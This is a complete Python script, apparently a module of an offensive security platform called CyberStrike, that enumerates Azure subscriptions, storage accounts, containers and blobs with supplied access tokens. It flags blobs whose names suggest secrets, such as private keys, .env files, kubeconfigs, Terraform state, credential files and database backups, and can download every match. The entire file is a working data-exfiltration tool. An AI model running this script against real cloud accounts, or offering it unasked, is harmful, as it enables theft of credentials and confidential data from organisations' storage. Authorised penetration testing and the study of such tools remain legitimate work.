#!/usr/bin/env python3
"""
storage_dump.py — Azure Storage Data Exfiltration

Lists storage accounts, enumerates containers and blobs,
identifies sensitive files, and optionally downloads them.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import re
import signal
import sys
import time
from datetime import datetime

try:
    import requests
except ImportError:
    print("ERROR: requests required. Install: pip3 install requests", file=sys.stderr)
    sys.exit(1)

ARM_BASE = "https://management.azure.com"

SENSITIVE_PATTERNS = [
    r"\.env$", r"\.pem$", r"\.key$", r"\.pfx$", r"credential", r"secret",
    r"password", r"\.tfstate$", r"backup.*\.(sql|tar|gz|zip)$",
    r"config.*\.(json|yaml|yml|ini)$", r"id_rsa", r"kubeconfig",
]


class StorageDumper:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.token = args.token or os.environ.get("AZURE_ACCESS_TOKEN", "")
        self.storage_token = args.storage_token or os.environ.get("AZURE_STORAGE_TOKEN", "")
        self.patterns = [re.compile(p, re.IGNORECASE) for p in SENSITIVE_PATTERNS]

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Azure Storage Dump")
        print("=" * 70)
        print(f"PID:           {os.getpid()}")
        print(f"ARM token:     {'set' if self.token else 'NOT SET'}")
        print(f"Storage token: {'set' if self.storage_token else 'NOT SET'}")
        print(f"Download:      {self.args.download}")
        print(f"Output:        {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:       {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            rtype = record.get("type", "info")
            name = record.get("name", "unknown")
            detail = record.get("detail", "")
            print(f"[{rtype.upper():<12}] {name:<50} {detail}", flush=True)

    def arm_headers(self):
        return {"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"}

    def storage_headers(self):
        return {"Authorization": f"Bearer {self.storage_token}", "x-ms-version": "2023-11-03"}

    def match_blob(self, name):
        for pattern in self.patterns:
            if pattern.search(name):
                return pattern.pattern
        return None

    def list_storage_accounts(self):
        accounts = []
        url = f"{ARM_BASE}/subscriptions?api-version=2022-12-01"
        r = requests.get(url, headers=self.arm_headers(), timeout=30)
        if r.status_code != 200:
            self.emit({"type": "error", "name": "subscriptions", "detail": f"HTTP {r.status_code}"})
            return accounts

        for sub in r.json().get("value", []):
            if not self.running:
                break
            sub_id = sub["subscriptionId"]
            sa_url = f"{ARM_BASE}/subscriptions/{sub_id}/providers/Microsoft.Storage/storageAccounts?api-version=2023-05-01"
            sa_r = requests.get(sa_url, headers=self.arm_headers(), timeout=30)
            if sa_r.status_code == 200:
                for sa in sa_r.json().get("value", []):
                    name = sa["name"]
                    accounts.append({
                        "name": name,
                        "blob_endpoint": f"https://{name}.blob.core.windows.net/",
                        "subscription_id": sub_id,
                        "location": sa.get("location"),
                        "kind": sa.get("kind"),
                    })
        return accounts

    def list_containers(self, blob_endpoint):
        containers = []
        url = f"{blob_endpoint}?comp=list"
        try:
            r = requests.get(url, headers=self.storage_headers(), timeout=30)
            if r.status_code == 200:
                import xml.etree.ElementTree as ET
                root = ET.fromstring(r.text)
                for container in root.iter("Container"):
                    name_el = container.find("Name")
                    if name_el is not None:
                        containers.append(name_el.text)
        except Exception as e:
            self.emit({"type": "error", "name": blob_endpoint, "detail": f"list containers: {e}"})
        return containers

    def list_blobs(self, blob_endpoint, container):
        blobs = []
        url = f"{blob_endpoint}{container}?restype=container&comp=list"
        try:
            r = requests.get(url, headers=self.storage_headers(), timeout=30)
            if r.status_code == 200:
                import xml.etree.ElementTree as ET
                root = ET.fromstring(r.text)
                for blob in root.iter("Blob"):
                    name_el = blob.find("Name")
                    size_el = blob.find(".//Content-Length")
                    if name_el is not None:
                        blobs.append({
                            "name": name_el.text,
                            "size": int(size_el.text) if size_el is not None else 0,
                        })
        except Exception as e:
            self.emit({"type": "error", "name": f"{container}", "detail": f"list blobs: {e}"})
        return blobs

    def scan_account(self, account):
        if not self.running:
            return
        endpoint = account["blob_endpoint"]
        self.emit({"type": "account", "name": account["name"], "detail": f"location={account.get('location')} kind={account.get('kind')}"})

        containers = self.list_containers(endpoint)
        for container in containers:
            if not self.running:
                break
            blobs = self.list_blobs(endpoint, container)
            sensitive = [b for b in blobs if self.match_blob(b["name"])]

            self.emit({
                "type": "container",
                "name": f"{account['name']}/{container}",
                "detail": f"blobs={len(blobs)} sensitive={len(sensitive)}",
                "total_blobs": len(blobs),
                "sensitive_count": len(sensitive),
            })

            for blob in sensitive:
                if not self.running:
                    break
                matched = self.match_blob(blob["name"])
                self.emit({
                    "type": "sensitive",
                    "name": f"{account['name']}/{container}/{blob['name']}",
                    "detail": f"size={blob['size']} pattern={matched}",
                    "account": account["name"],
                    "container": container,
                    "blob_name": blob["name"],
                    "size": blob["size"],
                    "matched_pattern": matched,
                })

                if self.args.download:
                    output_dir = self.args.output_dir or f"/tmp/cs_azure_{account['name']}"
                    local_path = os.path.join(output_dir, container, blob["name"])
                    os.makedirs(os.path.dirname(local_path), exist_ok=True)
                    blob_url = f"{endpoint}{container}/{blob['name']}"
                    try:
                        r = requests.get(blob_url, headers=self.storage_headers(), timeout=60)
                        if r.status_code == 200:
                            with open(local_path, "wb") as f:
                                f.write(r.content)
                            self.emit({"type": "download", "name": blob["name"], "detail": f"saved to {local_path}"})
                    except Exception as e:
                        self.emit({"type": "download_error", "name": blob["name"], "detail": str(e)})

    def run(self):
        self.print_banner()

        if not self.storage_token and not self.token:
            print("ERROR: At least one token required. Set --token or --storage-token.", file=sys.stderr)
            sys.exit(1)

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        if self.args.account_name:
            account = {
                "name": self.args.account_name,
                "blob_endpoint": f"https://{self.args.account_name}.blob.core.windows.net/",
                "location": "unknown",
                "kind": "unknown",
            }
            self.scan_account(account)
        elif self.token:
            accounts = self.list_storage_accounts()
            self.emit({"type": "info", "name": "accounts", "detail": f"Found {len(accounts)} storage accounts"})
            for account in accounts:
                if not self.running:
                    break
                self.scan_account(account)
        else:
            print("ERROR: --account-name or ARM token required.", file=sys.stderr)
            sys.exit(1)

        self.cleanup()

    def cleanup(self):
        print(f"\n--- storage_dump summary ---")
        print(f"Total records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Discover and download sensitive files from Azure Storage accounts.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 storage_dump.py --account-name myaccount --storage-token $TOKEN\n"
            "  python3 storage_dump.py --token $ARM_TOKEN --storage-token $STORAGE_TOKEN --download\n"
        ),
    )
    parser.add_argument("--account-name", type=str, default=None, help="Specific storage account name")
    parser.add_argument("--token", type=str, default=None, help="Azure ARM access token")
    parser.add_argument("--storage-token", type=str, default=None, help="Azure Storage access token")
    parser.add_argument("--download", action="store_true", default=False, help="Download matched files")
    parser.add_argument("--output-dir", type=str, default=None, help="Download directory")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    dumper = StorageDumper(args)
    dumper.run()


if __name__ == "__main__":
    main()
